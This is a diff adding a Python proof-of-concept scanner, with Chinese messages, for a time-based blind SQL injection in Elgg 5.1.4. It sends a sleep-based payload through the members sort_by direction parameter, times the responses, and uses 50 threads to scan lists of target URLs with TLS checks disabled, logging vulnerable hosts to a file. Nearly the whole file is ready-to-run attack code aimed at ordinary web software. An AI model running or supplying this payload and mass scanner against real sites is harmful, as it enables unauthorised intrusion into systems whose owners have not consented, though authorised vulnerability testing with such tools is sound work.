@@ -1,0 +1,66 @@
+import argparse
+import sys
+import requests
+from multiprocessing.dummy import Pool
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def poc(target):
+    payload = "/members?sort_by%5Bproperty%5D=name&sort_by%5Bproperty_type%5D=metadata&sort_by%5Bdirection%5D=desc%2c(select*from(select(sleep(6)))a)"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1",
+        "Connection": "close"
+    }
+    target = target.strip()
+    try:
+        
+        res1 = requests.get(url=target, headers=headers, verify=False, timeout=10)
+        if res1.status_code == 200:
+            
+            res2 = requests.get(url=target + payload, headers=headers, verify=False, timeout=20)
+            
+            res1_time = res1.elapsed.total_seconds()
+            res2_time = res2.elapsed.total_seconds()
+            
+            if res2_time - res1_time >= 5:
+                print(f"[+]{target}存在SQL注入漏洞")
+                with open('result1.txt', 'a', encoding='utf-8') as fp:
+                    fp.write(target + '\n')
+            else:
+                print(f"[-]{target}不存在SQL注入漏洞")
+        else:
+            print(f"[*]{target}响应状态码非200，请手工测试")
+    except Exception as e:
+        print(f"[!]{target}请求异常：{e}")
+
+def main():
+    parser = argparse.ArgumentParser(description="Elgg 5.1.4 SQL注入漏洞检测工具")
+    parser.add_argument('-u', '--url', dest='url', type=str, help='请输入单个目标URL')
+    parser.add_argument('-f', '--file', dest='file', type=str, help='请输入包含目标URL的文件路径')
+    args = parser.parse_args()
+
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list = []
+        try:
+            with open(args.file, 'r', encoding='utf-8') as fp:
+                for line in fp.readlines():
+                    url = line.strip()
+                    if url:
+                        url_list.append(url)
+            if url_list:
+                mp = Pool(50)
+                mp.map(poc, url_list)
+                mp.close()
+                mp.join()
+            else:
+                print("文件中没有有效的URL")
+        except Exception as e:
+            print(f"读取文件时发生错误：{e}")
+    else:
+        print(f"Usage: python {sys.argv[0]} -h")
+
+if __name__ == '__main__':
+    main()
